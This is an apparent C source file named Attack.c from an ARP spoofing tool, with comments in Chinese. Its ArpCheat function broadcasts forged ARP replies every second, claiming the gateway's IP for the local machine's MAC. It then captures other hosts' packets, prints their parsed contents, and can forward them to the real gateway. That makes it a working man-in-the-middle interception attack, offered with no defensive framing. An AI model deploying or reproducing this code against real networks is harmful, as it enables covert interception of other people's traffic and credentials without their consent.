#ifndef _SKYSY_ARPATTACK_ATTACK_C
#define _SKYSY_ARPATTACK_ATTACK_C

#include "Attack.h"

int isEqualMac(uint8_t* x, uint8_t* y);

void ArpCheat(pcap_t *adhandle, uint8_t* netseg, uint8_t* mymac, uint8_t* myip, int op)
{
    struct pcap_pkthdr *header;
    const uint8_t    *captured;
    struct PacketInformation pinf;
    int status;
    uint8_t desMac[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t gateway[4];
    uint8_t gwMac[8];
    uint8_t resMac[8];
    uint8_t reqIp[4];
    uint8_t reqMac[8];
    time_t last, now;

    memcpy(gateway, netseg, 3);
    gateway[3] = 1;

    /* 获取网关Mac地址 */
    status = GetHostMacByIp(gateway, gwMac);
    if (!status) {
        printf("Get Gateway Mac failed!\n");
        return;
    }

    time(&last);
    while(1) {
        time(&now);
        /* 距离上次发包超过1S，才进行下次广播 */
        if(now - last >= 1) {
            /* 改造全局广播，声明主机身份 */
            (void)SendArpData(adhandle, desMac, gateway, mymac, gateway, 2, 1);
            last = now;
        }
        
        /* 实时接受所有数据包 */
        if (pcap_next_ex(adhandle, &header, &captured) == 1) {
            memcpy(reqMac, captured + 6, 6);
            memcpy(resMac, captured, 6);

            if (!isEqualMac(reqMac, gwMac) && !isEqualMac(reqMac, mymac) && !isEqualMac(resMac, gwMac)) {
                AnalysePacket((uint8_t*)captured, header->len, &pinf);
                PrintPacketInformation(&pinf);

                /* OP为1，转发接受到的包 */
                if (op) {
                    memcpy((void *)captured, gwMac, 6);
                    pcap_sendpacket(adhandle, captured, header->len);
                }          
            }
        }
    }
}

int isEqualMac(uint8_t* x, uint8_t* y)
{
    for (int i = 0; i < 6; i++) {
        if (x[i] != y[i]) {
            return 0;
        }
    }

    return 1;
}

#endif